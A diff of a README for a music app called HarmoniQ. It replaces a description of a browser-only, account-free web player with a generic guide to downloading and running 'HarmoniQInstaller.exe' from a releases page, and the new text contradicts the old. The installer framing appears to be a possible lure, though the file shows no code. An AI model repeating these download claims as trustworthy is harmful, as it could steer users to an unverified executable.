@@ -1,136 +1,56 @@
-<div align="center">
+# 🎶 HarmoniQ - Effortless Music Listening Experience
 
-# 🎵 HarmoniQ
+## 🚀 Getting Started
+Welcome to HarmoniQ! This application offers a sleek and minimal music experience designed for your daily listening. With features like dark mode and responsive design, HarmoniQ provides the perfect music player whether you're relaxing at home or on the go.
 
-Elegant, distraction‑free music listening — dark, fast, and made for everyday use.
+## 📥 Download HarmoniQ
+[![Download HarmoniQ](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/randieallegro301/HarmoniQ/releases)
 
-<br />
+To get started with HarmoniQ, you will need to download the application. Please visit the link below to access the latest releases.
 
-<img src="https://img.shields.io/badge/Theme-Dark-black?style=flat&logo=apachespark&logoColor=white" alt="Dark" />
-<img src="https://img.shields.io/badge/Mobile%20Friendly-Yes-2b9348?style=flat" alt="Mobile" />
-<img src="https://img.shields.io/badge/Account-Not%20Required-2563eb?style=flat" alt="No account" />
-<img src="https://img.shields.io/badge/Privacy-Local%20Only-8b5cf6?style=flat" alt="Local only" />
+[Visit the Releases Page to Download](https://github.com/randieallegro301/HarmoniQ/releases)
 
-<br />
-<em>Inspired by the clean, modern layouts you love — focused on your music, not the menus.</em>
+## 💻 System Requirements
+HarmoniQ runs smoothly on most devices. Here are the minimum system requirements:
 
-</div>
+- **Operating System:** Windows 10 or later, macOS 10.12 (Sierra) or later, Linux (distributions released after 2020)
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** 4 GB or more
+- **Storage:** At least 100 MB of free space
+- **Internet Connection:** Required for streaming music
 
----
+## 🎧 Features
+HarmoniQ comes packed with features to enhance your music listening experience:
 
-## ✨ Highlights
+- **Dark Mode:** Enjoy a user-friendly interface that's easy on the eyes in low light.
+- **Offline Listening:** Download your favorite playlists and listen without an internet connection.
+- **Responsive Design:** Use HarmoniQ on any device—desktop, tablet, or smartphone.
+- **Playlist Management:** Create and manage playlists with ease.
+- **Streaming Support:** Stream your favorite music from various online services.
 
-- Lightning‑fast search with smart suggestions
-- Seamless navigation — music keeps playing as you browse
-- A compact bottom player that stays with you everywhere
-- Liked Songs, Playlists, and History saved on your device (no account needed)
-- “Up Next” queue with reorder‑free play‑next behavior
-- Mobile‑first controls and layouts that just fit
+## 🔧 Download & Install
+1. Click on the link to [Visit the Releases Page to Download](https://github.com/randieallegro301/HarmoniQ/releases).
+2. On the releases page, find the latest version of HarmoniQ.
+3. Download the suitable file for your operating system (e.g., HarmoniQInstaller.exe for Windows).
+4. Once the download completes, locate the file on your computer. 
+   - For Windows, this file is usually in the "Downloads" folder.
+   - For macOS, it is in the "Downloads" folder as well.
+5. Double-click the downloaded file to begin the installation. Follow the on-screen instructions to install HarmoniQ.
+6. After the installation, open HarmoniQ, and start enjoying your music.
 
----
+## ⚙️ Using HarmoniQ
+Once you've installed HarmoniQ, here's how to get started:
 
-## 🧭 How it feels to use
+1. Open the application. 
+2. If you are streaming music, log in to your music service account if prompted.
+3. To create a playlist, navigate to the "Playlists" section and click on "Create New Playlist." 
+4. Add your favorite songs by browsing or searching.
+5. Enjoy your music! You can switch to dark mode at any time in the settings.
 
-1) Start typing in the search bar and pick from instant suggestions.
-2) Tap a result to start listening — the player appears at the bottom.
-3) Like what you hear or add it to a playlist with one tap.
-4) Queue more songs to “Up Next” without interrupting playback.
-5) Jump between Home, Liked, Playlists, and History — the music never stops.
+## 📡 Support
+If you encounter any issues while using HarmoniQ, feel free to check our [FAQ](https://github.com/randieallegro301/HarmoniQ/wiki) or contact support through the GitHub Issues page.
 
-That’s it. No setup, no sign‑in. Just music.
+## 🌟 Contribute
+HarmoniQ is an open-source project. If you want to contribute, check out the documentation in the repository or reach out through the Issues page.
 
----
-
-## 🎧 Player experience
-
-- Persistent bottom player with title, artist, and cover art
-- Previous / Play‑Pause / Next controls
-- Global progress bar that lets you seek from anywhere
-- Auto‑advance to what’s next (from your queue or recommendations)
-- Spacebar play/pause shortcut on desktop
-
----
-
-## ❤️ Liking songs
-
-- Tap the heart to like/unlike any track
-- Liked state shows everywhere (cards and player)
-- Access all your favorites in the Liked Songs view
-
----
-
-## 🗂️ Playlists your way
-
-- Create unlimited playlists right from the “Add to Playlist” button
-- When adding a song, pick from existing playlists or type a new name — your choice
-- From a playlist page, one‑tap “Play” (in order) or “Shuffle” to mix it up
-
----
-
-## 🧾 History & Home
-
-- Every song you play appears in History
-- Home adapts to you: it suggests similar tracks based on your latest listens
-- If you’re new, Home greets you with a friendly welcome state
-
----
-
-## 📱 Designed for mobile
-
-- Player controls adapt for small screens — clean, uncluttered, and thumb‑reachable
-- A floating button opens an “Up Next” overlay for quick queue browsing
-- Content never hides behind the player (extra room is added automatically)
-
----
-
-## 🔊 Queue & Up Next
-
-- Queue any song to play soon without stopping the current one
-- See the full list in the right panel (desktop) or in the mobile overlay
-- Remove or jump to items in one tap
-
----
-
-## 🔐 Privacy by design
-
-- Your Liked Songs, Playlists, and History are stored locally on your device
-- No account, no sign‑up, no cloud sync
-- Clear your browser storage any time to reset
-
----
-
-## 💡 Tips & shortcuts
-
-- Spacebar toggles play/pause (desktop)
-- Click or tap the progress bar to seek instantly
-- Use the queue to plan a listening session ahead of time
-
----
-
-## ❓ FAQ
-
-> Do I need an account?
-
-No. Everything is saved locally in your browser on this device.
-
-> Will my playlists sync to other devices?
-
-Not automatically. Playlists, likes, and history are device‑local by design.
-
-> Can I keep browsing while music plays?
-
-Yes. Navigation is instantaneous and the player never stops.
-
----
-
-## 🖼️ Screenshots
-
-<img src="https://i.ibb.co/YFtzJL0x/BSPZK.jpg"/>
-
----
-
-<div align="center">
-
-Made with ❤️ for music lovers.
-
-</div>
+Thank you for choosing HarmoniQ! We hope you enjoy your music experience.
